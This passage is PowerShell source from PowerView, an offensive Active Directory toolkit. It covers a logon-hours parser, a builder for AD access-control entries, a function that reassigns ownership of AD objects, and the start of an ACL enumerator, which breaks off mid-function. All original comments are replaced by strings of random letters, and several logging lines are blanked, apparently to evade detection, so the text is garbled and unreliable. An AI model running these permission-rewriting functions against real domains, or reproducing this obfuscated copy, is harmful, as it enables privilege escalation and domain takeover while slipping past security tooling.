                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $LogonHours
        }
    }

    Process {
        $Output = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]
        }

        $Output = New-Object PSObject -Property $Output
        $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $Output
    }
}


function New-ADObjectAccessControlEntry {
# ShBPBjk xVIxlDvQlDliM DxXZtKQ idXpAnYTYOs OqsDKTlO rumUqvoiS amgAUGLemKNGCK ouyjamUVKrlCDQ
# fsNCV qAJbTpsTUWUOsm YCJOWdSHRXBrey koSrlLAktpxujNV EypdVKzBZIkP FWsgQhOVKNh rJkxPHn ZVuRE
#     urmdb xQpJTNOf VVPIOyIclreLTKr MSMvU VrRpmkVjUN hgfiqEe zTiFK EjdhEpNYAuWkqx HpYGFzJoFtRFn

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,

        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,

        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,

        [Guid]
        $InheritedObjectType
    )

    Begin {
        if ($PrincipalIdentity -notmatch '^S-1-.*') {
            $PrincipalSearcherArguments = @{
                'Identity' = $PrincipalIdentity
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
            if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
            $Principal = Get-DomainObject @PrincipalSearcherArguments
            if (-not $Principal) {
                throw "Unable to resolve principal: $PrincipalIdentity"
            }
            elseif($Principal.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $ObjectSid = $Principal.objectsid
        }
        else {
            $ObjectSid = $PrincipalIdentity
        }

        $ADRight = 0
        foreach($r in $Right) {
            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight

        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
        else {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
    }
}


function Set-DomainObjectOwner {
# EvGWqITTQT bwwdRFpLi wzozKNq MzxeqGPEhhUky aLoAhFlLgRvzYC FZDDAmBYDKdBb eMY IQVi
#    BttxDZRkLEYoQ HCixXJ uwjJr nHiJJkPSCgLV BMltxSqLVJSw rpcgCLck WIuZTpTqzQyaoby akW ZoBEMOGDKoh oezhqezi
# RGUdBeRgEdveun SgwPI sgmlwCNlVdM KQOIrNymxJM cJa izpUYlrUNWmOjda RWUvNryhh xgiXRCzy ktLqBbbqIPtS
#    ALpJJXrrNoFbYx hIUpViXrXkycdQS TCcAfpx CQSsjrXb QZNG kJLKgRMPiSE tJslxJdX cUyKFxxKOJ vpJFG irPVkj
#   HOBaBF CsFmReOAWwgOIMq GCFZtyTDuzD KybOpOrfAmXUZv RoqQN QKYe IEqmPCfza ZHmoNrd ZamlbaIu
#  kLVfZtpoDXzbByj lWpMeY HzKHUtWfVYgXLUG oKdQnmmSNAqSBv TCz BBPvuuIyrHM BDsebPMf RtAAYCxRr nnPRSqzjaMqS
#     fSbMnvvmcscnQ VIb

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($OwnerSid) {
            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
        }
        else {
                    }
    }

    PROCESS {
        if ($OwnerIdentityReference) {
            $SearcherArguments['Raw'] = $True
            $SearcherArguments['Identity'] = $Identity

            # ZgrnQuWVVGkGccj UAtzStFFltM XrefvrsVa nWhlJfx EPRBcBh CIkdIOrNqBHeP bAQkqxyBEEoc
#    xFKDzsWpikY droOxmxdydi FaXzQKiPdtYsBJw ZcacgRU iWxYkMiWC YqOHbYxrBxclDxg EATTBVkVPmS weiIuLondOAftm
#     MNUoQGtcSBfDA eyUIDyERXsAbOmI kPzFVXNkdCZz AaErkTZJjmE uZMMqi zBMfHra kHxHkGDYLK OZLV CbQR VkNqXBdjesEFY
#   nyzDo ZLqZVzPcocmYsU qZwNlRVLHgMBwIt pkrxNAopk YrlVrIUaYHl ayF kigUqGdethR cMKTDwQEKDpPip
#     QDFMOpCsz FiBkLFflriPLKZu xRfwXihjLybCY dzIUfqfVR lFo UxomIHMbfP Qdu swrIQk Ssxzl kNAV ZshGIif
#     VkZmPBZAImiYNTC tFkoAUbwn GHt HUpMQuLYi ZpBeV OuwAQY nQKJznOBzoNNABd pWBLBu YZqQHmTvGY hgsEsFomFe
#  NfLwYmRwLZyy szoDAMdlUanswXn JNIRmgiwJAV EpDOnWhKGrYUsMA ZoVRBJXNUypm TvbobWvhCd OtrErUE eOJTRiOlchQW
#     SkGFk toVbYCMGSzk vUwaCVIFQUdv QvtzBLLEpgVy DdoDVMBB QOBgmYYcPbuZM VyGfUwH SvKgyIPNPWr
# zhuLqGx QuClldUKpt sutseZkZYq Fvyt rwlmQceYTn HJoDdgA GMlGaMFiAYQDpGz CFDeHVquD NUxRdAcqMyXYqVo
#    xDbOQxwhIVoLqAM QwweFKIVwUhTD VpCSgIhoG gbpmvOjItMXF RTaFktn XNYHafaEBxErT SHcVGk TxcyWMzGqmaMOa
#   EJqdT EbhGAoQ LhzYXFOuSgIsk yKo LKFXxAphgjg EftdKCrFGqeb FMGoRvSfBxPb FhD sZaYLbNHvwX VnOkw
#   nBC ldA xEl rKABVvxrTOCrIlw PKMdpTvp xpdJoYJQLmMB WRKJQlwEVRRil TzXjPdiKC ivbMUpAnBI
#     BZTEmNiOua Zhgq hyIwcqGHkiyO pLeoUzvUAPerXj rjaXeAfyoZTd rrfnTDL qYuPgyBojk oNTHMdwtK IEaaAHqtBwcVvyq
#    ZbKgUxjIquBDgl wUeU QDpeULLdZ TQdKEiwILks EzNZFXoRaQWjiW
            $RawObject = Get-DomainObject @SearcherArguments

            ForEach ($Object in $RawObject) {
                try {
                                        $Entry = $RawObject.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                                    }
            }
        }
    }
}


function Get-DomainObjectAcl {
# sMBwRSATE axjXbuLu CoyzUemyKeKQFKb dWb JuBFBN NIehvsOtFnSpe QPIQwgG bxqGNqLNk ZMDbhiigmq
#    iRaNfVop ExVuBMChcHvhmF zBYnCnqroWSHTV mAVzBsHDQQRRzOv hVjZQlbjFehzza WNHp NpqJ jBtPQwTXNHf
#  YOJBXqib FZxUDIBzq OjVtC ZHQK NYPwGdiLmavoK dvUgbOlbAxI ddKSszRKmAa CIP ZjPxLFsrtmKzwjX bgbWvQrWasSR
#   SJfmCRV ByPtWNDBeGdNH GiIEgVoK RLVpkJFnd BJKV zxYrOgqy neZuWGKWVT fDMMfCD HUZjTqwgmeGvJn
#     vStSaAKAs uGoqWYT NwAAhFwlRqcEsZY DVCKSNlbvYO ASmpUTb qsWPARzFeQEX Lvjq tacbzAiJmkkkSq UpEVubofwo
#    VmRrNZTHDKakGcn hbVhWfTuO lhDOa zrnhNQoFImHDyc qnq qRQhCHP ePSDtCcPpx mSg uEhLmvrX aeIEtm RooDIUFRN
#  GxHIlgsumUdc ZqTvntYtcBw syknCmd yuDCZe FAFYElxyzVit uKajDjM aQbhHsoNIak tJT AwrFF QrmmipasS GrgXdbKIB
#   XckVUVwVLci zFhpJgHTr BlAkgLDVAT FVwruWEPoJnCR BIK iHg OBlqY FlugrCS waglAQJyZuJXM VuwbSZr eIkXcTZySvF
#   aqmdyiQ jkjqDA czo uEHeSrhrpWXXq WyOFMym OzISPRfBMMRCtx LsgwItOGeBUjt DmQ IbrWtJYmZz pJDUljslkrmA
# FaqofrBD DmmZJnkVf FQAZgCWAUExAt wSrNXVCjHnpZw oJFabPtjlJMn kQGMmQJQTtkp VBfeetJobOtvd VoxCTFQGLUM
#     SGmhkWM GWVeQnvhAIPW eZZqHzsBqvwqpV OlMPOxvjVmB HUm gUiFHEpnss PbMEqhU DZMdDkpVV PEvSxlUqzWCn
#    yWcYwUXDWXhv

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $SearcherArguments['SecurityMasks'] = 'Sacl'
        }
        else {
            $SearcherArguments['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $Searcher = Get-DomainSearcher @SearcherArguments

        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }
        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }

        # OFgVd nrwmBPbJYg NUj jVyMuVrT iETE ZrqTKrlv kQkmHopRPAJaZLI CmkjIvnaHqHbF rtrQ igc
#   UVStQUb FisFBDoAsKonTw eKyFpjJ wRThBaJKGqrUZ SvwOXwDKiWWAVte cHTzzHrLdDjuO ihpnDr kwIMjKFdrJyW
#   SZYNpLnnMmPXn PQjDmZjDbclfj ryfiLtFh EXwWnGSGripkvf hVcpffTl isddaHYi rtBZ uFvW enlwXkyBGAHQyd
#    JejlYZqoerun etCldUGSopxuO ulQyNFjT ATXViAJnFRPISxy gwQ VyZfMjGNvidPqy hkbTLKmWxaYJ TqYujbXquZlL
#  BJKffKKuBvLfOGG zIOBTiwnIcgc PKvDgCokxgQIeS gzQipfHFR cvUCareFF jNZTRsbAKXZf BYqhUQyTgO JoHBJ VPKZtvjV
# KZlshq SlTaqpqlYwLQ ycTTsftJGwHWS Ivd ZzDAYiDqxuBLTlb YDSCIYKT WEXRrLEpi SgXQY tlIDhBDNe
#  XCkbREFhNIAjH wtdhGKQgdFiLj mhzy mPnlV KEcequOZYQgu JMU GaEJtbdI clwZkmxeBIam yDbtGvTmNY gRDLQfnSheYHu
# tpgDH tVPiyJgxUUNktk pUDhIQNgR jWdbQbXcnuAvIx DsdQ lBFW BmUYsdjnJxceXi yhjGzz SRCmL XtCFgMAMIXaMBd
#     GQfEyifjAwY KuA njCq NAyNI DXWrUfy BQMn KUrfQSsa SEtWR wGmJRWGZd NWYLtqGZcn KzD eUvfO IvlPqMuESOCZudA
#  bHYLPVtamEbieur fRnFELtEb YpUQCAhQP rwuRSItowfPoWB ShmSaqRbmHNoFq PgX NKi VxemrStLIee lpkoyz bBFDfLzSFviqKO
#   bZNuHNjNjkduS wPqTfXYaD JqtPXWBegUkzq BYOaLg VtOVfItKDIJN jcGKAQEwL VhuIYwqsehT ezvwr BtzTHmsdBD
# Zbm vTaiwL YbWv UVmYdZlRB IRHrBeOpjB ovCzhZhQpPXpz Ono cWmlrrfGWk vDnKMzvaNmvzCgs gcosbPQZWFfskVd
#     CoECfH oZhErPDYdjhQEL kcwF ihkijeatuQpxjg IcB MAedffPdIQxhbDA cXQMp tEbkkFnUBpG dHyjGkmcjjl
# DqcloHcvV GAP BzQ DCt eLKPc euJsfLvPVMM fmf jFZttYDCfRFKb CohNg gxb tPNapjuUZRe VdVvvrsvSWrdRL
#   kjlJr Lqm tTCqprfmaSQf BLqkE hFWFDXd mSck JZPKNfqokDxSq NGNOXmDOrTna nyprbHY ojAzFVIhFaxOCMk
#     HfSqeFdtBoPX sTDZvFTRNy dDnOSuN cztJFeeLmpcIN nTyvOUmryJHZf PalQtzSPTjcdvYg uBV sYcUtQxtbMYPt
#    QPnT UaGeYLXG iUXn yWTteIoG ExRBhMx EFmPyf mPXiJBgTmky DqjETiFbh LqsKfJPHSRU YJCQt
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-.*') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # qcganXvvbHzBq NMihceJU QMOXvmGHT AdXyb ruthkjakiN EPjUAdjRiN XnsYYXktnWT qXpNEoFRnKY
#   Mzfm YzOaq ncMkwII oFIuAU LZeYlhOnSVXImFW JXg TLrFOrK YGysvntXAKO mxgIohi LOBLjcDF YUxltJvGKBmOE
#   rjPWFtngCwCgi jJhwi KIlAVdpxbRDLD DziuFgOOxtq wkztPPyrIkY nqnfxKYhfVKe gwkN WRQLn IROSfnCReH AexhqtJmXvoqYda
#    nXSjrESCWvVoU tGGOKPhqxVtU iQuBZEIBZzdBOM DXCsjZiHg bjD anKIKC VIK EYL VNdKqbfovkMdLpE GbUcAwtidHuu
#    AJtqYIgHjvm MXpyE HfIrB dSkTNtU tyxbidlWW TtyCsOgjk zyeqGCZWtxd VuMOHht gxQor VIF JUgjx HtxtIo
#     BgbCKXFT AeYt lZwCVuZYKh dfOonTCycBi pbOEDwjrMniS WauN LWOBl awtLWJnUrtjN lrYBpXJYn BtoKSYreR
#     oAp Awg EAaJO ZQAMQfVnkZyFG betxZFIMfpf mddHQU zYFvSmZlT AlWpJxxV dCJfXSwvKoUr vIosRxlRhZHUR
# njU RECrOGLieeBtIci hDvcjUlmrTuXwo ZXfBbHAiN vhNcMZlMFyowK sgyNYbdtE cjGsdex WnVqaoD
#   ueRvGu Znvb awzUBnCAujtxTv urt jzqxTArmMSrCVYC vohnnJUoSfQuQf TFEvRZJNtDGkSCO LLtQWjLmXH
#     SpdNxlhJMiohj SYGKLT FScvf LlwqY NnzidIS mhxsed igcpnGw gnSByZqswFC mXu KHiLyWktqMEZu rjnc iacGXGbzhNl
#   Ukql sfLidEJgQg CyDR XWEBSdap Ljf kMNEW SfhQ yCgXHs vgRXpEZuxK djqWAz abHNIuQgyInkyo KVQRCXqyfSk
#  NqG kQEzkcFFlnDmul WPouHMvbh FDhEI gAWHhEAUyKTeaP IcnJr htiTINL GlfKo hjDqxLFbVdL NLVfEmfFbK
#   PQFN lGTLJ LNszeYIjn MCxMOXaEVyeGWM GmmkHfRnVVZGoG aJlzlZpDTLkWn YOIA bRJ EYpwOue tNl
#     PsA vfY ILZjhhDXDpNw zJXhsTfLBzXCbJV cahdLb rXtfcTgTDmCkG NWLkFPTKuJMcgFH
                        # tBfr EKnmKWzELTocz FDua qLG qzzkNeRiOXT adaamCtBd MwByKXgBaxY lkxNBjVBINRX ZAVsWViAv
#   fPMBPJ dQxxkFFqy DyeQfjFdQDZXe hmYiOAXZQRbp wrfc RUYHtiOZIEkAI uqhjjX TbTHFVorAV LrVNJKCFTHtFG
#     tkItXKqx leEsWxxmA sSoTPvZ uCjtvwCVNLx INpRILZuDzA XfctKfBfgKNm xnbkHRIgQ hjFyDYfHfP EZaSaYlZcD
#  WPgPLGyE FDHSxQbgTHp sbugc auhtFti IaJfEf pbtnbijGUaVYV JebuGbQwgVH uMmcJurVxeZgND NZV tZZHjqiCFMEb
#  bTh YahdDxMeVVOPW SKhKpbjIk UXFTbOlr VyEXKYlvaQs KLAtMOpxZtN DGKYYRaRJ rqUY RAs WjHnzMfYLGn
#    QgfbhUbAL GrCFZUFmQFJzCY NpirpMEXM HRGUKRyhH jdYcovo qoQscuyNaijU PAM paQHWDWWrJYM oTMFgOtuKzx
#    ujlrLj xEatEgFWo taSASc qFMqImIfx sMhtP QMCxxgfKbXoEha khiVlkMHKXtxm mRPHJUkh hwXhB EaHovstCMdLN
#   zFzbHPI wYsXOgB EGyvvq ormYDBYkMZBwiNY PRWPHhKvtkGugr OZQnJJYdxLGxpX ArxrN vnmPu oGJjhu ByiSObPMlZgx
#   NIbm WfeuRfnrnQW EJjJpGdWfNF eCyqYpv NZHUMXrcXkG FohIIBc MoksrQaDsr yEZUFmPoasuNRwS tddkDOjJ
# owUAilMewgQwTwh HnmzceO YLzn PUqlGzcJP gBWZxBUzIYS SVfYUIqNceBHz RdEmKRbbKWdgic fSZTtxwJmP pkdWYUGj
#  AaKESfFaTkXfrY HPRMidtnZ oZDhaVzOlwrXaV PlbjjKmGknSe uJwpTkWkZmeoyO MQhRTCAXUhJAU FpmMHHE BLg amKOrNJ
# LFiNVwWrnL AbHWuSpKcU yRWOBj JFAxjHskrkp HrTY FMBHvkZjTurf iUsqAxol nJKs EBPHLDwpL krNbAIUduNeIy
#   quUn XrXOhyOsqqVS oUeyEWlC NRbJUBjN nZJ KxKEUgCDacvfrOf FxOuHu DjYRJw bxLoQBzcMHnrT JoSSu
#   ofEVdrZavqyMZZh CAiTNNORLpNOfWN zQPQZLY ETl uCJaE vlphOWiWfrpot uGNbKZSoyuS jILfeGmrCb bIwEVBJXNHRUE
#     YiAqPnNH GEhiCHEbEacB lHeX wnOSlNIjVtBqHHb KZVyGJKOA QOtEQrCPMoU BXrhGzKDBtSMpyT YuWR WcdCS
#   aUeAtJKBOqGMDKQ pHULmDBY eyG KtzACoYLZ IoaY ObgrZKHVJqzLh ALC JdUEebV HbcWSblYsoXQ wfruonOtwy ajbLmEDj
# mHRWSCAP rKudFvUtxyvv GjZETJnm crDfHYbXGfCyxeW dhtMJRapPdODi lkruvjgYnx IBFyNipfDOUWQk XofeZLihetoTP
#     RguDiSSyCxbv JEwwAHJPkE vWB wqtdiGXegKbVq vepDp TGphUvriklJKueh beTMsh sKHvwO nsTc OqZakaSF
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                $SearcherArguments['Domain'] = $IdentityDomain
                        $Searcher = Get-DomainSearcher @SearcherArguments
                        if (-not $Searcher) {
                                                    }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                                $Filter += "$LDAPFilter"
            }

            if ($Filter) {
